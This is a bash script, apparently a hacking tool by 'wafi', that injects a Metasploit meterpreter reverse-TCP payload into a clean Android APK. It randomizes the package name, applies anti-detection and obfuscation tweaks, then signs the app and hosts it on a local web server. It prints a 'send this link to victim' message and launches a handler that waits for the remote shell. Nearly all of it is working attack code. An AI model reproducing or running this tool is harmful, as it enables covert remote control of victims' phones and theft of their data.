#!/bin/bash
# Advanced APK Payload Injector Script for Android 13/14 - Enhanced
# Author: wafi
# Version: 3.0 (Stealth + Obfuscation Enabled)

clear
cat << "EOF"

  █████╗ ██████╗ ██╗  ██╗    ██████╗  █████╗ ████████╗
 ██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
 ███████║██████╔╝█████╔╝     ██████╔╝███████║   ██║   
 ██╔══██║██╔═══╝ ██╔═██╗     ██╔═══╝ ██╔══██║   ██║   
 ██║  ██║██║     ██║  ██╗    ██║     ██║  ██║   ██║   
 ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   
                                                     
      Android Payload Injector (Bypass Android 13/14)
               This tool made by Wafi (Enhanced)
EOF

sleep 2

# Root Check
echo "[*] Checking for Root Access..."
if [[ $EUID -ne 0 ]]; then
  echo "[!] Please run this script as root!"
  exit 1
fi

# Install Required Tools
echo "[*] Installing required packages..."
apt update -y >/dev/null
pkgs=(openjdk-17-jdk wget unzip curl metasploit-framework apache2)
for pkg in "${pkgs[@]}"; do
  apt install -y $pkg >/dev/null
  command -v $pkg >/dev/null || echo "[!] $pkg failed to install!"
done

# Install apktool manually
echo "[*] Installing apktool 2.9.0..."
wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.0.jar -O /usr/local/bin/apktool.jar
chmod +x /usr/local/bin/apktool /usr/local/bin/apktool.jar
echo -e '#!/bin/bash\nexec java -jar /usr/local/bin/apktool.jar "$@"' > /usr/local/bin/apktool
chmod +x /usr/local/bin/apktool

# Setup zipalign and apksigner from Android SDK Build-Tools
echo "[*] Setting up build-tools (zipalign & apksigner)..."
mkdir -p /opt/android-sdk && cd /opt/android-sdk || exit
wget -q https://dl.google.com/android/repository/build-tools_r33.0.2-linux.zip
unzip -q build-tools_r33.0.2-linux.zip
cp -r android-13/* /usr/local/bin/
chmod +x /usr/local/bin/zipalign /usr/local/bin/apksigner
cd ~ || exit

# Payload Configuration
clear
read -p "[?] Set LHOST: " lhost
read -p "[?] Set LPORT: " lport
echo "[*] Available APK files:"
ls *.apk
read -p "[?] Enter original (clean) APK filename: " capk
read -p "[?] Enter output (binded) APK filename: " bapk

# Generate Random Package Name
rand_pkg="com.$(tr -dc a-z </dev/urandom | head -c 6).$(tr -dc a-z </dev/urandom | head -c 5)"
echo "[*] Generated stealth package name: $rand_pkg"

# Create Payload
echo "[*] Generating payload..."
msfvenom -x "$capk" -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --pkg-name $rand_pkg -o "$bapk" >/dev/null 2>&1

# Decompile APK
apktool d "$bapk" -o bind_out -f >/dev/null || { echo "[!] Failed to decompile APK"; exit 1; }
cd bind_out || exit

# Bypass + Obfuscation
echo "[*] Applying anti-detection tricks..."
# Reduce suspicious permissions
sed -i '/INTERNET/!s/<uses-permission/<uses-permission android:maxSdkVersion="32"/g' AndroidManifest.xml
# Change package name in manifest
sed -i "s/package=\".*\"/package=\"$rand_pkg\"/g" AndroidManifest.xml

# Rename smali folders to match new package name
original_pkg=$(grep package AndroidManifest.xml | cut -d'"' -f2)
old_path="$(echo "$original_pkg" | tr '.' '/')"
new_path="$(echo "$rand_pkg" | tr '.' '/')"
mkdir -p smali/$new_path
cp -r smali/$old_path/* smali/$new_path/
rm -rf smali/$old_path

# Light smali obfuscation
find smali* -type f -name "*.smali" -exec sed -i 's/const-string v0, ".*"/const-string v0, "xyz"/g' {} \;

cd ..

# Rebuild
apktool b bind_out -o binded.apk >/dev/null
zipalign -p 4 binded.apk "$bapk"

# Sign the APK
echo "[*] Signing the APK..."
keytool -genkey -keystore my-release-key.keystore -storepass password -keypass password -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Mehedi, OU=Payload, O=Hack, L=BD, S=BD, C=BD" >/dev/null 2>&1
apksigner sign --ks my-release-key.keystore --ks-pass pass:password --key-pass pass:password --out signed_$bapk "$bapk"

# Deploy
sudo service apache2 start
cp signed_$bapk /var/www/html/
clear
echo "[✔] Payload injected and obfuscated successfully!"
echo "[+] Send this link to victim: http://$lhost/signed_$bapk"
echo "[*] Launching Metasploit handler..."
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"
